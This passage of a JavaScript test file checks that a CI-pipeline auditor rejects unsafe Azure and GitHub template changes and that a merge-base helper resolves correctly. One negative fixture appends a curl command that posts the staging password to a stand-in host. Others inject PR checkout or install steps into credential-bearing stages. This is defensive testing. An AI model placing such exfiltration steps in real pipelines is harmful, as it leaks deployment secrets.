    'the qa test script also posting the password': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)" && curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n'),
    'two qa test steps': stagingStep('          - script: node qaAuthority/qa/bin/qa.mjs test --env staging --base-url "$(STAGING_URL)"\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
  };
  assert.ok(beforeProd);
  for (const [name, yaml] of Object.entries(fixtures)) {
    assert.ok(auditAzure(yaml).length > 0, `rejected: ${name}`);
  }
});

test('Azure audit rejects a credential variable anywhere but its own gated release stage', () => {
  const real = azureYaml.endsWith('\n') ? azureYaml : `${azureYaml}\n`;
  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
  const stage = (name, lines) => `${real}- stage: ${name}\n  jobs:\n  - job: evil\n    steps:\n${lines}`;
  const fixtures = {
    'a PR-code job with checkout, npm ci and a production variable': stage('Evil', '    - checkout: self\n    - script: npm ci\n    - script: node run.mjs\n      env:\n        QA_PRODUCTION_PASSWORD: $(QA_PRODUCTION_PASSWORD)\n'),
    'a new stage with another name mapping a staging variable': stage('Smoke', '    - script: node run.mjs\n      env:\n        QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
    'the STAGING stage mapping production variables': mutate('QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)', 'QA_STAGING_PASSWORD: $(QA_PRODUCTION_PASSWORD)'),
    'the PROD stage mapping staging variables': mutate('QA_PRODUCTION_PASSWORD: $(QA_PRODUCTION_PASSWORD)', 'QA_PRODUCTION_PASSWORD: $(QA_STAGING_PASSWORD)'),
    'the STAGING stage without its dependsOn chain': mutate('- stage: STAGING\n  dependsOn: DEV\n', '- stage: STAGING\n'),
    'the STAGING stage depending on a stage that never reaches DEV': mutate('- stage: STAGING\n  dependsOn: DEV\n', '- stage: STAGING\n  dependsOn: Plan\n'),
    'the STAGING stage without the release parameter gate': mutate("- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", '- stage: STAGING\n  dependsOn: DEV\n  condition: succeeded()'),
    'the DEV stage with a negated condition': mutate("- stage: DEV\n  dependsOn: [Test, Judge, Report]\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: DEV\n  dependsOn: [Test, Judge, Report]\n  condition: not(and(succeeded(), eq('${{ parameters.release }}', 'true')))"),
    'the STAGING stage with not(and(...))': mutate("- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: STAGING\n  dependsOn: DEV\n  condition: not(and(succeeded(), eq('${{ parameters.release }}', 'true')))"),
    'the STAGING stage with or(...)': mutate("- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: STAGING\n  dependsOn: DEV\n  condition: or(succeeded(), eq('${{ parameters.release }}', 'true'))"),
    'the STAGING stage with ne(...)': mutate("- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), ne('${{ parameters.release }}', 'true'))"),
    'the STAGING stage with always()': mutate("- stage: STAGING\n  dependsOn: DEV\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: STAGING\n  dependsOn: DEV\n  condition: always()"),
    'the PROD stage with always()': mutate("- stage: PROD\n  dependsOn: STAGING\n  condition: and(succeeded(), eq('${{ parameters.release }}', 'true'))", "- stage: PROD\n  dependsOn: STAGING\n  condition: always()"),
    'the STAGING stage on the wrong environment': mutate('    environment: STAGING\n', '    environment: PROD\n'),
    'the STAGING stage that checks out the PR': mutate('          - script: ./deploy.sh STAGING', '          - checkout: self\n          - script: ./deploy.sh STAGING'),
    'the STAGING stage that installs PR code': mutate('          - script: ./deploy.sh STAGING', '          - script: yarn install\n          - script: ./deploy.sh STAGING'),
  };
  for (const [name, yaml] of Object.entries(fixtures)) {
    const violations = auditAzure(yaml);
    assert.ok(violations.length > 0, `rejected: ${name}`);
  }
});

test('trusted publishers consume validated data without checking out or installing PR code', () => {
  assert.match(githubYaml, /pull_request_target:/, 'the privileged planner workflow definition must come from the base branch');
  assert.match(githubPublisher, /workflow_run:/);
  assert.match(githubPublisher, /issues:\s*write/);
  assert.match(githubPublisher, /pull-requests:\s*write/);
  assert.match(githubPublisher, /name:\s*qa-plan/);
  assert.match(githubPublisher, /name:\s*qa-run-results/);
  assert.match(githubPublisher, /publish-evidence/);
  assert.doesNotMatch(githubPublisher, /qa-verdict|verdict\.json|validate-publish-payload/);
  assert.doesNotMatch(githubPublisher, /github\.event\.pull_request\.head\.sha|npm\s+(?:ci|install)/);
  const githubReport = githubJobs(githubYaml).find(job => job.name === 'report').source;
  assert.doesNotMatch(githubReport, /verdict\.json|qa-verdict/);
  assert.match(azurePublisher, /resources:\s*\n\s*pipelines:/);
  assert.match(azurePublisher, /artifact: qa-plan/);
  assert.match(azurePublisher, /artifact: qa-run-results/);
  assert.match(azurePublisher, /publish-evidence/);
  assert.doesNotMatch(azurePublisher, /verdict\.json|qa-verdict|validate-publish-payload/);
  assert.match(azurePublisher, /QA_BOARD_WRITE_TOKEN/);
  assert.doesNotMatch(azurePublisher, /checkout:\s*self[\s\S]{0,100}?pullRequest|npm\s+(?:ci|install)/i);
  const azureReport = azureYaml.split('- stage: Report')[1]?.split('- stage: DEV')[0] ?? '';
  assert.doesNotMatch(azureReport, /verdict\.json|qa-verdict/);
});

const FILE_GATED_BASE = /\[\s*-[fse]\s+[^\]]*base[^\]]*\]\s*;\s*then[^\n]*--base-results/;
const BASE_PROOF_COMMENT = /#\s*optional\s+base-proof/i;

test('base-run detector flags the file-gated form and the comment-only form', () => {
  assert.match('if [ -f qa-run-results/base-run-v1.json ]; then args+=(--base-results x); fi', FILE_GATED_BASE);
  assert.match('if [ -f "$base_run" ]; then extra=(--base-results "$base_run"); fi'.replace('$base_run', 'base_run'), FILE_GATED_BASE);
  assert.match('# Optional base-proof job: check out merge-base', BASE_PROOF_COMMENT);
});

test('GitHub template runs a real base-proof job and requires its results when scenarios are new or changed', () => {
  const jobs = githubJobs(githubYaml);
  const proof = jobs.find(job => job.name === 'base-proof');
  assert.ok(proof, 'base-proof must be a job, not a comment');
  assert.match(proof.source, /qa\.mjs test[^\n]*base-run-v1\.json/, 'base-proof must run the scenarios and write base-run-v1.json');
  assert.match(proof.source, /NOT RUN/, 'a missing base results file must fail with a NOT RUN message');
  assert.match(proof.source, /persist-credentials: false/);
  const judge = jobs.find(job => job.name === 'judge');
  assert.match(judge.source, /needs: \[[^\]]*base-proof[^\]]*\]/, 'judge must wait for base-proof');
  assert.match(judge.source, /--base-results/);
  assert.match(judge.source, /NOT RUN/);
  assert.doesNotMatch(githubYaml, FILE_GATED_BASE, '--base-results must not depend on a file existing');
  assert.doesNotMatch(githubYaml, BASE_PROOF_COMMENT);
});

test('Azure template runs a real base-proof job and requires its results when scenarios are new or changed', () => {
  const proof = azureJobs(azureYaml).find(job => job.name === 'base_proof');
  assert.ok(proof, 'base_proof must be a job, not a comment');
  assert.match(proof.source, /qa\.mjs"? test[^\n]*base-run-v1\.json/, 'base_proof must run the scenarios and write base-run-v1.json');
  assert.match(proof.source, /NOT RUN/, 'a missing base results file must fail with a NOT RUN message');
  assert.match(proof.source, /persistCredentials: false/);
  assert.match(azureYaml, /- stage: Judge\n  dependsOn: \[Plan, Test\]/, 'Judge must see the plan outputs and wait for the tests');
  assert.match(azureYaml, /--base-results/);
  assert.match(azureYaml, /NOT RUN: red-on-base proof is missing/);
  assert.doesNotMatch(azureYaml, FILE_GATED_BASE, '--base-results must not depend on a file existing');
  assert.doesNotMatch(azureYaml, BASE_PROOF_COMMENT);
});

// ---- merge base, not the target tip ----
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const qaCli = new URL('../bin/qa.mjs', import.meta.url).pathname;

function gitIn(cwd, ...args) {
  const run = spawnSync('git', ['-c', 'user.email=t@example.invalid', '-c', 'user.name=t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8' });
  assert.equal(run.status, 0, run.stderr);
  return run.stdout.trim();
}

function divergedRepo() {
  const dir = mkdtempSync(join(tmpdir(), 'qa-merge-base-'));
  gitIn(dir, 'init', '-q', '-b', 'main');
  gitIn(dir, 'commit', '-q', '--allow-empty', '-m', 'common ancestor');
  const ancestor = gitIn(dir, 'rev-parse', 'HEAD');
  gitIn(dir, 'checkout', '-q', '-b', 'feature');
  gitIn(dir, 'commit', '-q', '--allow-empty', '-m', 'feature work');
  const head = gitIn(dir, 'rev-parse', 'HEAD');
  gitIn(dir, 'checkout', '-q', 'main');
  gitIn(dir, 'commit', '-q', '--allow-empty', '-m', 'target advanced 1');
  gitIn(dir, 'commit', '-q', '--allow-empty', '-m', 'target advanced 2');
  const tip = gitIn(dir, 'rev-parse', 'HEAD');
  return { dir, ancestor, head, tip };
}

const mergeBase = (repo, ...extra) => spawnSync(process.execPath, [qaCli, 'merge-base', '--repo', repo.dir, '--head', repo.head, '--target', repo.tip, ...extra], { encoding: 'utf8' });

test('merge-base resolves the common ancestor, not the target tip, when the target advanced after divergence', () => {
  const repo = divergedRepo();
  try {
    assert.notEqual(repo.ancestor, repo.tip);
    const run = mergeBase(repo);
    assert.equal(run.status, 0, run.stderr);
    assert.equal(run.stdout.trim(), repo.ancestor);
    assert.notEqual(run.stdout.trim(), repo.tip);
  } finally { rmSync(repo.dir, { recursive: true, force: true }); }
});

test('merge-base --expect fails with NOT RUN when the recorded base is the target tip or has no baseSha', () => {
  const repo = divergedRepo();
  try {
    const tip = mergeBase(repo, '--expect', repo.tip);
    assert.equal(tip.status, 1);
    assert.match(tip.stderr, /NOT RUN: .*wrong commit/);
    const missing = mergeBase(repo, '--expect', 'undefined');
    assert.equal(missing.status, 1);
    assert.match(missing.stderr, /NOT RUN/);
    const ok = mergeBase(repo, '--expect', repo.ancestor);
    assert.equal(ok.status, 0, ok.stderr);
  } finally { rmSync(repo.dir, { recursive: true, force: true }); }
});

test('merge-base fails with NOT RUN when history is too shallow to resolve it', () => {
  const repo = divergedRepo();
  const shallow = mkdtempSync(join(tmpdir(), 'qa-merge-base-shallow-'));
  try {
    const clone = spawnSync('git', ['clone', '-q', '--depth', '1', '--no-single-branch', `file://${repo.dir}`, shallow], { encoding: 'utf8' });
    assert.equal(clone.status, 0, clone.stderr);
    const run = spawnSync(process.execPath, [qaCli, 'merge-base', '--repo', shallow, '--head', repo.head, '--target', repo.tip], { encoding: 'utf8' });
    assert.equal(run.status, 1);
    assert.match(run.stderr, /NOT RUN: cannot resolve the merge base/);
  } finally {
    rmSync(repo.dir, { recursive: true, force: true });
    rmSync(shallow, { recursive: true, force: true });
  }
});

test('GitHub template checks out the resolved merge base with full history and verifies it in judge', () => {
  const jobs = githubJobs(githubYaml);
  const proof = jobs.find(job => job.name === 'base-proof').source;
  assert.match(proof, /fetch-depth: 0/, 'base-proof needs full history to find the merge base');
  assert.match(proof, /qa\.mjs merge-base\b/, 'base-proof must resolve the merge base');
  assert.match(proof, /git checkout --detach "\$mb"/, 'base-proof must check out the resolved merge base');
  assert.match(proof, /base-meta\.json/, 'base-proof must record baseSha');
  assert.doesNotMatch(proof, /ref:[^\n]*pull_request\.base\.sha/, 'the target tip is not the merge base');
  assert.doesNotMatch(proof, /--commit "\$\{\{[^}]*pull_request\.base\.sha/, 'the base run must be recorded at the merge base');
  const judge = jobs.find(job => job.name === 'judge').source;
  assert.match(judge, /qa\.mjs merge-base --repo app[^\n]*--expect/, 'judge must verify the recorded baseSha against the resolved merge base');
});

test('Azure template checks out the resolved merge base with full history and verifies it in judge', () => {
  const proof = azureJobs(azureYaml).find(job => job.name === 'base_proof').source;
  assert.match(proof, /fetchDepth: 0/);
  assert.match(proof, /qa\.mjs"? merge-base\b/, 'base_proof must resolve the merge base');
  assert.match(proof, /git checkout --detach "\$mb"/);
  assert.match(proof, /base-meta\.json/);
  assert.doesNotMatch(proof, /git checkout --detach "\$\(System\.PullRequest\.TargetCommitId\)"/, 'the target tip is not the merge base');
  assert.doesNotMatch(proof, /--commit "\$\(System\.PullRequest\.TargetCommitId\)"/);
  assert.match(azureYaml, /qa\.mjs merge-base --repo[^\n]*--expect/, 'judge must verify the recorded baseSha against the resolved merge base');
});
